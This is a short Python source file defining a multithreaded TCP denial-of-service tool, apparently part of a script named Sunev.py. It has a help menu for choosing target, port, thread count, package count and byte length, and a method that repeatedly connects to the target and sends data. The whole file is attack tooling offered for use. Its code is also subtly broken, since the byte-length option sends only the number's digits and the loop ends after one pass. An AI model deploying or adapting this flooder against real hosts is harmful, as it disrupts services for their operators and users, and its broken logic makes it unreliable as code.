import threading
import socket

class DenialOfService:
  def __init__(self) -> None:
    __slots__ = ("colors", "sends", "commands")
    
    self.colors = {"Red": "\033[01;31m",
                  "Green": "\033[01;32m",
                   "End": "\033[0m"
                  }
    self.commands = ["-t", "-p", "-th", "-pkg", "-b"]
    self.sends = 0

  def help_(self) -> None:
    print(f"""
        Command lines DoS:
            -h help to use
            -t for especifies of target
            -p for especifies of port
            -th number of threads
            -pkg number of packages for send
            -b for especifies of lenght bytes

            Example: python3 Sunev.py denial -t 127.0.0.1 -p 80 -th 5 -pkg 3 -b 1048
                """)

  def tcp(self, target: str, port: int, packages: int, bytes: int) -> None:
    while 1:
      try:
          tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          tcp.connect((target, port))
          for i in range(packages):
              tcp.send(str(bytes).encode("utf-8"))
              print(f"{self.colors['Green']}[SEND] Target >> {target} | Proxy >> Em Breve | Port >> {port}{self.colors['End']}")
      except:
          print(f"{self.colors['Red']}[NOT SEND] Target >> {target} | Proxy >> Em Breve | Port >> {port}{self.colors['End']}")
      tcp.close()
      break

  def main(self, list_args) -> None:
    dict_args = {"Target": list_args[0], "Port": int(list_args[1]), "Threads": int(list_args[2]), 
            "Bytes": int(list_args[4]), "Packages": int(list_args[3])}

    for i in range(dict_args["Threads"]):
      th = threading.Thread(target=self.tcp, args=(dict_args["Target"], dict_args["Port"], dict_args["Packages"], dict_args["Bytes"]))
      th.start()


